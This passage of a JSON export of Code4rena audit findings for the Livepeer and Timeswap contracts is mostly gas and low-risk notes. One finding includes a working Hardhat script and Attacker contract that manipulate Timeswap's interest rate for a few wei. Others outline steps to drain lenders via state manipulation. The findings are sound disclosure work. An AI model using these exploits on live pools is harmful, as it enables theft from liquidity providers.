confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  Tomio   # Vulnerability details  ## Impact expensive gas  ## Proof of Concept https://github.com/livepeer/arbitrum-lpt-bridge/blob/main/contracts/L1/gateway/L1LPTGateway.sol#L227  ## Tools Used Remix  ## Recommended Mitigation Steps change to `bytes memory emptyBytes;`  "}, {"title": "value argument in approve() function not required to be greater than 0", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/27", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "value argument in approve() function not required to be greater than 0"}, {"title": "burn() function does not check that _amount is larger than 0", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/25", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "burn() function does not check that _amount is larger than 0"}, {"title": "Public functions to external", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/21", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "Public functions to external"}, {"title": "Prefix increments are cheaper than postfix increments", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/19", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "Prefix increments are cheaper than postfix increments"}, {"title": "Upgrade pragma to at least 0.8.4", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/14", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "Upgrade pragma to at least 0.8.4"}, {"title": "Solidity compiler versions mismatch", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/10", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "Solidity compiler versions mismatch"}, {"title": "Not verified function inputs of public / external functions", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/8", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "Not verified function inputs of public / external functions"}, {"title": "Named return issue", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/6", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "Named return issue"}, {"title": "Missing 0 address check", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/4", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "Missing 0 address check"}, {"title": "No check that the amount arg that is being minted is larger than 0", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/2", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "No check that the amount arg that is being minted is larger than 0"}, {"title": "Manipulation of the Y State Results in Interest Rate Manipulation", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/187", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  Rhynorater   # Vulnerability details  ## Impact Due to lack of constraints on user input in the `TimeswapPair.sol#mint` function, an attacker can arbitrarily modify the interest rate while only paying a minimal amount of Asset Token and Collateral Token.   Disclosure: This is my first time attempting Ethereum hacking, so I might have made some mistakes here since the math is quite complex, but I'm going to give it a go.   ## Proof of Concept The attack scenario is this: A malicious actor is able to hyper-inflate the interest rate on a pool by triggering a malicious mint function. The malicious actor does this to attack the LP and other members of the pool.   Consider the following HardHat script: ``` const hre = require(\"hardhat\");   //jtok is asset //usdc is collat  async function launchTestTokens(tokenDeployer){     //Launch a token     const TestToken = await ethers.getContractFactory(\"TestToken\", signer=tokenDeployer);     const tt = await TestToken.deploy(\"JTOK\", \"JTOK\", 1000000000000000)     const tt2 = await TestToken.deploy(\"USDC\", \"USDC\", 1000000000000000)     let res = await tt.balanceOf(tokenDeployer.address)     let res2 = await tt.balanceOf(tokenDeployer.address)     console.log(\"JTOK balance: \"+res)     console.log(\"USDC balance: \"+res2)     return [tt, tt2] }  async function deployAttackersContract(attacker, jtok, usdc){     const Att = await ethers.getContractFactory(\"Attacker\", signer=attacker)     const atakcontrak = await Att.deploy(jtok.address, usdc.address)     return atakcontrak }  async function deployLPContract(lp, jtok, usdc){     const LP = await ethers.getContractFactory(\"LP\", signer=lp)     const lpc = await LP.deploy(jtok.address, usdc.address)     return lpc }  async function main() {     const [tokenDeployer, lp, attacker] = await ethers.getSigners();     let balance = await tokenDeployer.getBalance()     let factory = await ethers.getContractAt(\"TimeswapFactory\", \"0x5FbDB2315678afecb367f032d93F642f64180aa3\", signer=tokenDeployer)     //let [jtok, usdc] = await launchTestTokens(tokenDeployer)     let jtok = await ethers.getContractAt(\"TestToken\", \"0x2279b7a0a67db372996a5fab50d91eaa73d2ebe6\", signer=tokenDeployer)     let usdc = await ethers.getContractAt(\"TestToken\", \"0x8a791620dd6260079bf849dc5567adc3f2fdc318\", signer=tokenDeployer)     console.log(\"Jtok: \"+jtok.address)     console.log(\"USDC: \"+usdc.address)      //Create Pair     //let txn = await factory.createPair(jtok.address, usdc.address)     pairAddress = await factory.getPair(jtok.address, usdc.address)     pair = await ethers.getContractAt(\"TimeswapPair\", pairAddress, signer=tokenDeployer)     console.log(\"Pair address: \"+pairAddress);      // Deploy LP     //let lpc = await deployLPContract(lp, jtok, usdc)     let lpc = await ethers.getContractAt(\"LP\", \"0x948b3c65b89df0b4894abe91e6d02fe579834f8f\", signer=lp)       let jtokb = await jtok.balanceOf(lpc.address)     let usdcb = await usdc.balanceOf(lpc.address)     console.log(\"LP Jtok: \"+jtokb)     console.log(\"LP USDC: \"+usdcb)      //let txn2 = await lpc.timeswapMint(1641859791, 15, pairAddress)     let res = await pair.constantProduct(1641859791);     console.log(\"Post LP Constants:\", res);      let atakcontrak = await deployAttackersContract(attacker, jtok, usdc)      jtokb = await jtok.balanceOf(atakcontrak.address)     usdcb = await usdc.balanceOf(atakcontrak.address)     console.log(\"Attacker Jtok: \"+jtokb)     console.log(\"Attacker USDC: \"+usdcb)      //mint some tokens     let txn2 = await atakcontrak.timeswapMint(1641859791, 15, pairAddress)      let res2 = await pair.constantProduct(1641859791);     console.log(\"Post Attack Constants:\", res2);  } main().then(()=>process.exit(0))  ```  First, the LP deploys their pool and contributes their desired amount of tokens with the below contract: ``` pragma solidity =0.8.4;  import \"hardhat/console.sol\"; import {ITimeswapMintCallback} from \"./interfaces/callback/ITimeswapMintCallback.sol\"; import {IPair} from \"./interfaces/IPair.sol\"; import {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol'; interface TestTokenLP is IERC20{     function mmint(uint256 amount) external; }  contract LP is ITimeswapMintCallback {      uint112 constant SEC_PER_YEAR = 31556926;     TestTokenLP internal jtok;     TestTokenLP internal usdc;  constructor(address _jtok, address _usdc){     jtok = TestTokenLP(_jtok);     jtok.mmint(10_000 ether);     usdc = TestTokenLP(_usdc);     usdc.mmint(10_000 ether); }  function timeswapMint(uint maturity, uint112 APR, address pairAddress) public{     uint256 maturity = maturity;     console.log(\"Maturity: \", maturity);     address liquidityTo = address(this);     address dueTo = address(this);     uint112 xIncrease = 5_000 ether;     uint112 yIncrease = (APR*xIncrease)/(SEC_PER_YEAR*100);     uint112 zIncrease = (5*xIncrease)/3; //Static 167% CDP     IPair(pairAddress).mint(maturity, liquidityTo, dueTo, xIncrease, yIncrease, zIncrease, \"\"); }   function timeswapMintCallback(         uint112 assetIn,         uint112 collateralIn,         bytes calldata data     ) override external{         jtok.mmint(100_000 ether);         usdc.mmint(100_000 ether);         console.log(\"Asset requested:\", assetIn);         console.log(\"Collateral requested:\", collateralIn);         //check before         uint256 beforeJtok = jtok.balanceOf(msg.sender);         console.log(\"LP jtok before\", beforeJtok);         //transfer         jtok.transfer(msg.sender, assetIn);         //check after         uint256 afterJtok = jtok.balanceOf(msg.sender);         console.log(\"LP jtok after\", afterJtok);         //check before         uint256 beforeUsdc = usdc.balanceOf(msg.sender);         console.log(\"LP USDC  before\", beforeUsdc);         //transfer         usdc.transfer(msg.sender, collateralIn);         //check after         uint256 afterUsdc = usdc.balanceOf(msg.sender);         console.log(\"LP USDC After\", afterUsdc);              } }  ``` Here are the initialization values: ```     uint112 xIncrease = 5_000 ether;     uint112 yIncrease = (APR*xIncrease)/(SEC_PER_YEAR*100);     uint112 zIncrease = (5*xIncrease)/3; //Static 167% CDP ``` With this configuration, I've calculated the interest rate to borrow on this pool using the functions defined here: https://timeswap.gitbook.io/timeswap/deep-dive/borrowing to  be: ``` yMax: 4.7533146923118e-06 Min Interest Rate: 0.009374999999999765 Max Interest Rate: 0.14999999999999625 zMax: 1666.6666666666667  ``` Around 1% to 15%.   Then, the attacker comes along (see line containing `let atakcontrak` and after). The attacker deploys the following contract: ``` pragma solidity =0.8.4;  import \"hardhat/console.sol\"; import {ITimeswapMintCallback} from \"./interfaces/callback/ITimeswapMintCallback.sol\"; import {IPair} from \"./interfaces/IPair.sol\"; import {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol'; interface TestTokenAtt is IERC20{     function mmint(uint256 amount) external; }  contract Attacker is ITimeswapMintCallback {      uint112 constant SEC_PER_YEAR = 31556926;     TestTokenAtt internal jtok;     TestTokenAtt internal usdc;  constructor(address _jtok, address _usdc){     jtok = TestTokenAtt(_jtok);     jtok.mmint(10_000 ether);     usdc = TestTokenAtt(_usdc);     usdc.mmint(10_000 ether); }  function timeswapMint(uint maturity, uint112 APR, address pairAddress) public{     uint256 maturity = maturity;     console.log(\"Maturity: \", maturity);     address liquidityTo = address(this);     address dueTo = address(this);     uint112 xIncrease = 3;     uint112 yIncrease = 1000000000000000;     uint112 zIncrease = 5; //Static 167% CDP     IPair(pairAddress).mint(maturity, liquidityTo, dueTo, xIncrease, yIncrease, zIncrease, \"\"); }   function timeswapMintCallback(         uint112 assetIn,         uint112 collateralIn,         bytes calldata data     ) override external{         jtok.mmint(100_000 ether);         usdc.mmint(100_000 ether);         console.log(\"Asset requested:\", assetIn);         console.log(\"Collateral requested:\", collateralIn);         //check before         uint256 beforeJtok = jtok.balanceOf(msg.sender);         console.log(\"Attacker jtok before\", beforeJtok);         //transfer         jtok.transfer(msg.sender, assetIn);         //check after         uint256 afterJtok = jtok.balanceOf(msg.sender);         console.log(\"Attacker jtok after\", afterJtok);         //check before         uint256 beforeUsdc = usdc.balanceOf(msg.sender);         console.log(\"Attacker USDC  before\", beforeUsdc);         //transfer         usdc.transfer(msg.sender, collateralIn);         //check after         uint256 afterUsdc = usdc.balanceOf(msg.sender);         console.log(\"Attacker USDC After\", afterUsdc);              } } ```  Which contains the following settings for a mint: ```     uint112 xIncrease = 3;     uint112 yIncrease = 1000000000000000;     uint112 zIncrease = 5; //Static 167% CDP ```  According to my logs in hardhat: ```     Maturity:  1641859791     Callback before: 8333825816710789998373     Asset requested: 3     Collateral requested: 6     Attacker jtok before 5000000000000000000000     Attacker jtok after 5000000000000000000003     Attacker USDC  before 8333825816710789998373     Attacker USDC After 8333825816710789998379     Callback after: 8333825816710789998379     Callback expected after: 8333825816710789998379  ``` The attacker is only required to pay 3 wei of Asset Token and 6 wei of Collateral token. However, after the attacker's malicious mint is up, the interest rate becomes: ``` yMax: 0.0002047533146923118 Min Interest Rate: 0.40383657499999975 Max Interest Rate: 6.461385199999996 zMax: 1666.6666666666667 ``` Between 40 and 646 percent.   xyz values before and after: ``` Post LP Constants: [ BigNumber { value: \"5000000000000000000000\" },   BigNumber { value: \"23766573461559\" },   BigNumber { value: \"8333333333333333333333\" },   x: BigNumber { value: \"5000000000000000000000\" },   y: BigNumber { value: \"23766573461559\" },   z: BigNumber { value: \"8333333333333333333333\" } ] Attacker Jtok: 10000000000000000000000 Attacker USDC: 10000000000000000000000 Post Attack Constants: [ BigNumber { value: \"5000000000000000000003\" },   BigNumber { value: \"1023766573461559\" },   BigNumber { value: \"8333333333333333333338\" },   x: BigNumber { value: \"5000000000000000000003\" },   y: BigNumber { value: \"1023766573461559\" },   z: BigNumber { value: \"8333333333333333333338\" } ]  ```  This result in destruction of the pool.   "}, {"title": "Adding Unchecked Directive will Save Gas for BurnMath.sol#getAsset and BurnMath.sol#getCollateral functions", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/183", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  Rhynorater   # Vulnerability details  In `BurnMath.sol` we have the following function defined; ```     function getAsset(IPair.State memory state, uint256 liquidityIn) internal pure returns (uint128 assetOut) {         if (state.reserves.asset <= state.totalClaims.bond) return assetOut;          uint256 _assetOut = state.reserves.asset;         _assetOut -= state.totalClaims.bond;         _assetOut = _assetOut.mulDiv(liquidityIn, state.totalLiquidity);         assetOut = _assetOut.toUint128(); } ``` Since the above `if` statement ensures that `state.reserves.asset` is  not less than or equal to `state.totalClaims.bond`, it is impossible for the `_assetOut -= state.totalClaims.bond; ` line to underflow. As a result, adding the `unchecked` directive around this will save on gas.  By the same reasoning, in the `getCollateral` function: ``` deficit -= state.reserves.asset; ``` is already checked by the  ``` if (state.reserves.asset >= state.totalClaims.bond) { ``` `if` statement. Surrounding this with `unchecked` will also save on gas.  Lastly, this also applies in `WithdrawMath.sol#getCollateral`: ```         if (state.reserves.asset >= state.totalClaims.bond) return collateralOut;         uint256 deficit = state.totalClaims.bond;         deficit -= state.reserves.asset; ``` The deficit will never underflow here, so adding `unchecked` will save on gas.   ##References https://github.com/code-423n4/2022-01-timeswap/blob/5960e07d39f2b4a60cfabde1bd51f4b1e62e7e85/Timeswap/Timeswap-V1-Core/contracts/libraries/BurnMath.sol#L22 https://github.com/code-423n4/2022-01-timeswap/blob/5960e07d39f2b4a60cfabde1bd51f4b1e62e7e85/Timeswap/Timeswap-V1-Core/contracts/libraries/BurnMath.sol#L41 https://github.com/code-423n4/2022-01-timeswap/blob/5960e07d39f2b4a60cfabde1bd51f4b1e62e7e85/Timeswap/Timeswap-V1-Core/contracts/libraries/WithdrawMath.sol#L33   "}, {"title": "`10 ** 9` can be changed to `1e9` and save some gas", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/177", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L132-L132  ```solidity if (significantDigits > 10 ** 9) { ```  Can be changed to:  ```solidity if (significantDigits > 1e9) { ```  "}, {"title": "`SquareRoot#sqrtUp()` Wrong implementation", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/176", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SquareRoot.sol#L19-L22  ```solidity function sqrtUp(uint256 y) internal pure returns (uint256 z) {     z = sqrt(y);     if (z % y > 0) z++; } ```  For example, when `y = 9`: -   At L20, z = sqrt(9) = 3 -   At L21, z % y = 3 % 9 = 3, so that `z % y > 0` is true, therefore, `z++`, z is 4   Expected Results: sqrtUp(9) = 4  Actual Results: sqrtUp(9) = 3  ### Recommendation  Change to:  ```solidity function sqrtUp(uint256 y) internal pure returns (uint256 z) {     z = sqrt(y);     if (z * z < y) ++z; } ``` or  ```solidity function sqrtUp(uint256 y) internal pure returns (uint256 z) {     z = sqrt(y);     if (y % z != 0) ++z; } ```  "}, {"title": "Simplify `SquareRoot#sqrt()` can save gas", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/174", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  The check of `y > 3` is unnecessary and most certainly adds more gas cost than it saves as the majority of use cases of this function will not be handling `y <= 3`.  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SquareRoot.sol#L6-L17  ```solidity function sqrt(uint256 y) internal pure returns (uint256 z) {     if (y > 3) {         z = y;         uint256 x = y / 2 + 1;         while (x < z) {             z = x;             x = (y / x + x) / 2;         }     } else if (y != 0) {         z = 1;     } } ```  ### Recommendation  Change to:  ```solidity function sqrt(uint x) public pure returns (uint y) {     uint z = (x + 1) / 2;     y = x;     while (z < y) {         y = z;         z = (x / z + z) / 2;     } } ```  Or use:  https://github.com/Rari-Capital/solmate/blob/dd13c61b5f9cb5c539a7e356ba94a6c2979e9eb9/src/utils/FixedPointMathLib.sol#L150-L205   "}, {"title": "`SafeCast.sol#toUint128()` Validation of input value can be done earlier to save gas", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/173", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  Check input value earlier can avoid unnecessary code execution when this check failed.  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/SafeCast.sol#L13-L15  ```solidity function toUint128(uint256 x) internal pure returns (uint128 y) {     require((y = uint128(x)) == x); } ```  See: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4961a51cc736c7d4aa9bd2e11e4cbbaff73efee9/contracts/utils/math/SafeCast.sol#L48  ### Recommendation  Change to:  ```solidity function toUint128(uint256 value) internal pure returns (uint128) {     require(value <= type(uint128).max, \"SafeCast: value doesn't fit in 128 bits\");     return uint128(value); } ```  `SafeCast.sol#toUint112()` got the similar issue.  "}, {"title": "For uint `> 0` can be replaced with ` != 0` for gas optimization", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/172", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "For uint `> 0` can be replaced with ` != 0` for gas optimization"}, {"title": "Use short reason strings can save gas", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/171", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "Use short reason strings can save gas"}, {"title": "Unnecessary checked arithmetic in for loops", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/170", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "Unnecessary checked arithmetic in for loops"}, {"title": "`TimeswapConvenience.sol#borrowGivenDebt()` Attacker can increase `state.y` to an extremely large value with a dust amount of `assetOut`", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/169", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/BorrowMath.sol#L19-L53  This issue is similar to the two previous issues related to `state.y` manipulation. Unlike the other two issues, this function is not on `TimeswapPair.sol` but on `TimeswapConvenience.sol`, therefore this can not be solved by adding `onlyConvenience` modifier.  Actually, we believe that it does not make sense for the caller to specify the interest they want to pay, we recommend removing this function.  ## Impact  - When `pool.state.y` is extremely large, many core features of the protocol will malfunction, as the arithmetic related to `state.y` can overflow. For example:  LendMath.check(): https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/LendMath.sol#L28-L28  BorrowMath.check(): https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/BorrowMath.sol#L31-L31  - An attacker can set `state.y` to a near overflow value, then `lend()` to get a large amount of extra interest (as Bond tokens) with a small amount of asset tokens. This way, the attacker can steal funds from other lenders and liquidity providers.   "}, {"title": "Race condition on ERC20 approval", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/168", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2022-01-timeswap-findings", "body": "Race condition on ERC20 approval"}, {"title": "`TimeswapPair.sol#mint()` Malicious user/attacker can mint new liquidity with an extremely small amount of `yIncrease` and malfunction the pair with the maturity", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/165", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/MintMath.sol#L14-L34  The current implementation of `TimeswapPair.sol#mint()` allows the caller to specify an arbitrary value for `yIncrease`.  However, since `state.y` is expected to be a large number based at `2**32`, once the initial `state.y` is set to a small number (1 wei for example), the algorithm won't effectively change `state.y` with regular market operations (`borrow`, `lend` and `mint`).  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/BorrowMath.sol#L17-L37  The pair with the maturity will malfunction and can only be abandoned.  A malicious user/attacker can use this to frontrun other users or the platform's `newLiquidity()` call to initiate a griefing attack.  If the desired `maturity` is a meaningful value for the user/platform, eg, end of year/quarter. This can be a noteworthy issue.  ## Recommendation  Consider adding validation of minimal `state.y` for new liquidity.  Can be `2**32 / 10000` for example.  "}, {"title": "Inline unnecessary internal function can save gas", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/163", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  `checkProportional()` is a rather simple one line function, making it inline instead of an internal function call can make the code simpler and save some gas.  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L359-L368  ```solidity for (uint256 i; i < ids.length; i++) {     Due storage due = dues[ids[i]];     require(due.startBlock != BlockNumber.get(), 'E207');     if (owner != msg.sender) require(collateralsOut[i] == 0, 'E213');     PayMath.checkProportional(assetsIn[i], collateralsOut[i], due);     due.debt -= assetsIn[i];     due.collateral -= collateralsOut[i];     assetIn += assetsIn[i];     collateralOut += collateralsOut[i]; } ```  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/PayMath.sol#L7-L14  ```solidity function checkProportional(     uint112 assetIn,     uint112 collateralOut,     IPair.Due memory due ) internal pure {     require(uint256(assetIn) * due.collateral >= uint256(collateralOut) * due.debt, 'E303'); } } ```  Can be changed to:  ```solidity for (uint256 i; i < ids.length; i++) {     Due storage due = dues[ids[i]];     require(due.startBlock != BlockNumber.get(), 'E207');     if (owner != msg.sender) require(collateralsOut[i] == 0, 'E213');     require(uint256(assetIn[i]) * due.collateral >= uint256(collateralOut[i]) * due.debt, 'E303');     due.debt -= assetsIn[i];     due.collateral -= collateralsOut[i];     assetIn += assetsIn[i];     collateralOut += collateralsOut[i]; } ```   "}, {"title": "`TimeswapPair.sol#borrow()` Improper implementation allows attacker to increase `pool.state.z` to a large value", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/162", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  In the current implementation, `borrow()` takes a user input value of `zIncrease`, while the actual collateral asset transferred in is calculated at L319, the state of `pool.state.z` still increased by the value of the user's input at L332.  Even though a large number of `zIncrease` means that the user needs to add more collateral, the attacker can use a dust amount `xDecrease` (1 wei for example) so that the total collateral needed is rather small.  Plus, the attacker can always `pay()` the dust amount of loan to get back the rather large amount of collateral added.  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L299-L338  ```solidity function borrow(     uint256 maturity,     address assetTo,     address dueTo,     uint112 xDecrease,     uint112 yIncrease,     uint112 zIncrease,     bytes calldata data ) external override lock returns (uint256 id, Due memory dueOut) {     require(block.timestamp < maturity, 'E202');     require(assetTo != address(0) && dueTo != address(0), 'E201');     require(assetTo != address(this) && dueTo != address(this), 'E204');     require(xDecrease > 0, 'E205');      Pool storage pool = pools[maturity];     require(pool.state.totalLiquidity > 0, 'E206');      BorrowMath.check(pool.state, xDecrease, yIncrease, zIncrease, fee);      dueOut.debt = BorrowMath.getDebt(maturity, xDecrease, yIncrease);     dueOut.collateral = BorrowMath.getCollateral(maturity, pool.state, xDecrease, zIncrease);     dueOut.startBlock = BlockNumber.get();      Callback.borrow(collateral, dueOut.collateral, data);      id = pool.dues[dueTo].insert(dueOut);      pool.state.reserves.asset -= xDecrease;     pool.state.reserves.collateral += dueOut.collateral;     pool.state.totalDebtCreated += dueOut.debt;      pool.state.x -= xDecrease;     pool.state.y += yIncrease;     pool.state.z += zIncrease;      asset.safeTransfer(assetTo, xDecrease);      emit Sync(maturity, pool.state.x, pool.state.y, pool.state.z);     emit Borrow(maturity, msg.sender, assetTo, dueTo, xDecrease, id, dueOut); } ```  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/BorrowMath.sol#L62-L79  ```solidity function getCollateral(     uint256 maturity,     IPair.State memory state,     uint112 xDecrease,     uint112 zIncrease ) internal view returns (uint112 collateralIn) {     uint256 _collateralIn = maturity;     _collateralIn -= block.timestamp;     _collateralIn *= zIncrease;     _collateralIn = _collateralIn.shiftRightUp(25);     uint256 minimum = state.z;     minimum *= xDecrease;     uint256 denominator = state.x;     denominator -= xDecrease;     minimum = minimum.divUp(denominator);     _collateralIn += minimum;     collateralIn = _collateralIn.toUint112(); } ```  ## PoC  Near the maturity time, the attacker can do the following:  1. `borrow()` a dust amount of assets (`xDecrease` = 1 wei) and increase `pool.state.z` to an extremely large value (20x of previous `state.z` in our tests); 2. `pay()` the loan and get back the collateral; 3. `lend()` a regular amount of `state.x`, get a large amount of insurance token; 4. `burn()` the insurance token and get a large portion of the collateral assets from the defaulted loans.  ## Recommendation  Consider making `pair.borrow()` to be `onlyConvenience`, so that `zIncrease` will be a computed value (based on `xDecrease` and current state) rather than a user input value.  "}, {"title": "Remove unnecessary variables can save gas", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/161", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/DateTime.sol#L127-L134  ```solidity     function isValidDate(uint year, uint month, uint day) internal pure returns (bool valid) {         if (year >= 1970 && month > 0 && month <= 12) {             uint daysInMonth = _getDaysInMonth(year, month);             if (day > 0 && day <= daysInMonth) {                 valid = true;             }         }     } ```  The local variable `daysInMonth` is used only once. Making the expression inline can save gas.  ### Recommendation  Change to:  ```solidity     function isValidDate(uint year, uint month, uint day) internal pure returns (bool valid) {         if (year >= 1970 && month > 0 && month <= 12) {             if (day > 0 && day <= _getDaysInMonth(year, month)) {                 valid = true;             }         }     } ```  Other examples include:  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/Burn.sol#L76-L77  ```solidity         IPair pair = factory.getPair(params.asset, params.collateral);         require(address(pair) != address(0), 'E501'); ```  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L556-L558  ```solidity         IDue collateralizedDebt = natives[asset][collateral][maturity].collateralizedDebt;          require(msg.sender == address(collateralizedDebt), 'E701'); ```  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/Callback.sol#L62-L63  ```solidity         uint256 _assetReserve = asset.safeBalance();         require(_assetReserve >= assetReserve + assetIn, 'E304'); ```  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/Callback.sol#L51-L52  ```solidity         uint256 _collateralReserve = collateral.safeBalance();         require(_collateralReserve >= collateralReserve + collateralIn, 'E305'); ```  "}, {"title": "Unused imports", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/159", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "Unused imports"}, {"title": "`NFTTokenURIScaffold.sol#_isLtoStringTrimmedeapYear()` Check of `flag == 0` can be done earlier", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/157", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  `flag == 0` is cheaper 